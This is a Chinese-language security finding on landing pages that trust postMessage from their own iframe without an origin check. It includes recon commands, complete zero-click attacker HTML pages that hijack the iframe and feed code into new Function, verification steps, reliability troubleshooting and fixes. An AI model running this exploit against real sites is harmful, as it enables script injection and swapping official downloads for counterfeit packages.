# 落地页 postMessage「source 身份校验」绕过 → new Function 同源任意 JS 执行（DOM XSS）

适用面：APK / iOS plist / H5 下载落地页。外壳页（`/`）本身很薄，内联一个
`<iframe id="ifr">`，再加载一个带 hash 的 bundle（本例 `/js/landingpoker.<hash>.js`），
由 config 接口决定 `#ifr` 的 src（本例 `/template/<渠道>/<xx>/<ts>/index.html`）。
托管常见 IIS / nginx，响应头**无** `X-Frame-Options`、**无** CSP。

> 与同站另一条路的关系：`/template/<id>/index.html` 家族走的是
> `{action:"config"}` → `window.config=` 注入（无 origin/source 校验，但首行访问
> `window.parent.document`，跨源 iframe 直接 SecurityError，只能 `window.open`）。
> 本条是**不同文件、不同 sink**：外壳 bundle 的 `new Function(functionBody)`，
> 而且它**有** source 校验，靠翻转「被校验的那一帧属于谁」来绕过。两条独立，可分别利用。

## 0. 漏洞形状

```js
// /js/landingpoker.<hash>.js（压缩后形态）
window.addEventListener("message", function (n) {
  const t = document.getElementById("ifr");
  if (n.source && n.source === t.contentWindow &&
      "executeFunction" === n.data.action) {
    try {
      const f = new Function(n.data.functionBody);   // ← 任意代码，直接构造
      f.call(window);                                // ← 在本源执行
    } catch (e) { /* ... */ }
  }
});
```

两个关键点：

1. **没有 `n.origin` 校验**——只比 WindowProxy 身份。
2. `new Function(...)` 是 sink，消息体即代码，字符串不做任何白名单。

看似"只允许自己的 iframe 发消息"的校验，实际上可以被**改变帧的归属**绕过：
外壳页把 `#ifr` 的 src 指向目标站模板页，我方能跨源把这一帧导航到自己的
origin；导航完成后 `t.contentWindow` 指的就是我方页面的 WindowProxy，
`n.source === t.contentWindow` 自然成立。

## 1. 前置条件（全部实测口径）

- 目标落地页无 `X-Frame-Options`、无 `Content-Security-Policy`（`frame-ancestors`）。
- 外壳页存在 `id="ifr"` 的 iframe，且 bundle 里命中上面的监听体。
- `#ifr` 真的被赋了 src（config 接口以当前 token 命中缓存返回 200、渲染出
  `/template/.../index.html`）；否则没有可导航的子帧。
- 受害者用现代浏览器访问任意攻击者页面，**不需要在目标站点击或输入**。

## 2. 侦察

```bash
curl -sSk -D- 'https://<target-host>/' -o landing.html
grep -iE 'x-frame-options|content-security-policy' headers.txt   # 期望：都没有
grep -o 'src="[^"]*\.js"' landing.html                            # 找入口 bundle
grep -n '<iframe' landing.html                                    # 找 id="ifr"

curl -sSk 'https://<target-host>/js/<bundle>.js' -o bundle.js
grep -n 'addEventListener("message"' bundle.js
grep -n 'new Function\|contentWindow\|n.origin\|event.origin' bundle.js
```

判据：
- 监听体里有 `n.source === <el>.contentWindow`（或 event.source 类似比较），
  但**没有** `origin` 比较 → 有戏；
- 有 `new Function(` / `eval(` 且参数直接来自 `n.data.*` → sink 确认。

## 3. 攻击者页（免点击）

`exploit.html`（顶层，内嵌目标）：

```html
<!doctype html><meta charset="utf-8"><title>lp</title>
<iframe id="v" src="https://<target-host>/" width="900" height="700"></iframe>
<script>
  // 关键：等落地页 config 渲染、#ifr 有了 src 之后再导航，且只导航一次
  var NAV_AT = 8000;
  setTimeout(function () {
    try {
      var w = document.getElementById('v').contentWindow;
      // w.frames[0] 就是落地页里的 #ifr
      w.frames[0].location = 'https://<attacker-host>/inner.html';
    } catch (e) { console.log('nav fail', e); }
  }, NAV_AT);
</script>
```

`inner.html`（被装进 #ifr，向父页重投）：

```html
<!doctype html><meta charset="utf-8"><title>inner</title>
<script>
  setInterval(function () {
    parent.postMessage({
      action: 'executeFunction',
      functionBody: 'window.__pwned=1; document.title="PWNED_8419";'
    }, '*');
  }, 400);
</script>
```

要点：
- `targetOrigin` 写 `'*'`；对方不校验 origin。
- **重投**：父页监听注册、帧导航完成的时机不定，400ms 间隔持续投最稳。
- 不要在外层直接对 `v.contentWindow` postMessage —— 那会被 source 校验挡掉（见对照）。

## 4. 验证（在目标帧上下文取值）

用 Playwright / CDP 找到 `target503.example.com` 那个 frame 求值：

```js
({pwned: window.__pwned, title: document.title,
  href: location.href, hasIfr: !!document.getElementById('ifr'),
  ready: document.readyState})
```

命中回显（实测形态）：

```json
{"pwned":1,"title":"PWNED_8419","href":"https://<target-host>/","hasIfr":true,"ready":"complete"}
```

- `href` 仍是目标源 → 代码确实在该源内执行，不是攻击者域自嗨。
- `hasIfr:true` 说明命中的是外层落地页文档，不是被导航进去的 inner.html。

帧树参考（证明导航成功）：

```
["https://attacker.example/exploit.html",
 "https://target503.example.com/",
 "https://attacker.example/inner.html"]
```

## 5. 必跑对照（排除误报）

```html
<!-- control.html：顶部页直接向落地页 postMessage，不做帧导航 -->
<iframe id="v" src="https://<target-host>/"></iframe>
<script>
  var n = 0;
  var t = setInterval(function () {
    document.getElementById('v').contentWindow.postMessage(
      {action:'executeFunction', functionBody:'window.__pwned=1;'}, '*');
    if (++n > 24) clearInterval(t);
  }, 500);
</script>
```

预期：目标帧 `window.__pwned` 始终为 `null` —— `n.source !== #ifr.contentWindow`。
这条对照证明"能打通"靠的是**帧归属翻转**，而不是"多投几次总能中"。

## 6. 常见失败原因

| 现象 | 原因 / 处理 |
|---|---|
| 导航后子帧报 `net::ERR_ABORTED` | 导航太早（< ~8s），父页随后 `setAttribute('src', ...)` 把帧覆盖回去 → 等 config 渲染完成再导航 |
| 第一次成功、第二次失效 | 重复导航：父页会再次覆盖 src → **只导航一次**，失败就整页重载重来 |
| `frames[0]` 不存在 / 没有 #ifr | config 接口未命中（token 过期/未缓存）→ 落地页没给 `#ifr` 赋 src，刷新重取 |
| 帧导航成功但 `__pwned` 为 null | 消息没进到落地页文档：inner.html 里对 `parent` 投而不是 top；或间隔太快被浏览器节流（后台帧） |
| 目标帧里 `executeFunction` 不生效 | bundle 已更新：检查是否新增 `n.origin` 校验，或 sink 改成白名单函数名分发 |
| 页面根本嵌不进去 | 新增了 `X-Frame-Options: DENY/SAMEORIGIN` 或 CSP `frame-ancestors` → 此路作废 |

## 7. 影响

- 在官方下载域名源内执行任意 JS：可改写页面上的 APK / plist 下载直链、客服链接、
  「打开 App」链接（`javascript:`），把官方域名变成仿冒安装包分发点。
- 也可读该源下的 cookie / localStorage（若站点在该域挂会话或统计凭据）。
- 无需点击（受害者只要打开攻击页），比 `window.open` 型需要手势的路径更容易投递。
- 定级 high；若该域同时承载后台或带凭据的接口，可上调。

## 8. 修复建议（给防守方）

- 监听里补 `if (n.origin !== location.origin) return;`，并不要只信 source 身份。
- 彻底不要用 `new Function` / `eval` 处理跨窗口消息；改为受控动作名 + 参数白名单。
- 加 `Content-Security-Policy: frame-ancestors 'self'`（或 `X-Frame-Options: SAMEORIGIN`），
  同时给 `#ifr` 加 `sandbox`，减少被借壳的可能。
